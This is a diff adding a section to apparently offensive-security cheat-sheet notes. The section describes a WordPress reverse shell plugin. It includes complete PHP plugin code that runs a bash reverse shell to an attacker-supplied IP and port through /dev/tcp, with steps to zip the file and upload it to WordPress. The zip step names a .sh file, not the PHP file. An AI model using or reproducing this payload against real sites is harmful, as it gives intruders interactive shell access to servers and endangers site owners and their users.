@@ -98,4 +98,25 @@ console.log(encoded)
 
 Minified Javascript: https://jscompress.com/
 
+## WordPress reverse shell plugin
 
+https://www.sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell
+
+Php file:
+```
+<?php
+
+/**
+* Plugin Name: Reverse Shell Plugin
+* Plugin URI:
+* Description: Reverse Shell Plugin
+* Version: 1.0
+* Author: Vince Matteo
+* Author URI: http://www.sevenlayers.com
+*/
+
+exec("/bin/bash -c 'bash -i >& /dev/tcp/$AttackerIp/$AttackerPort 0>&1'");
+?>
+```
+then zip it: `zip revsh-wp-plugin.zip revsh-wp-plugin.sh` \
+and upload it on WordPress.
